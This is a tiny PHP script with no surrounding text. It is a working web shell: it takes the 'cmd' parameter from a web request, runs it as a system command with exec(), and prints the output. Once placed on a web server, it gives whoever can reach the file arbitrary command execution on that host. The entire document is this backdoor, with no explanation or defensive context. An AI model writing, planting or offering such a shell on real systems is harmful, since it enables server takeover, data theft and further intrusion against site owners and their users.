<?php 
$test = $_GET['cmd']; 
exec($test, $output1); 
var_dump($output1);
?>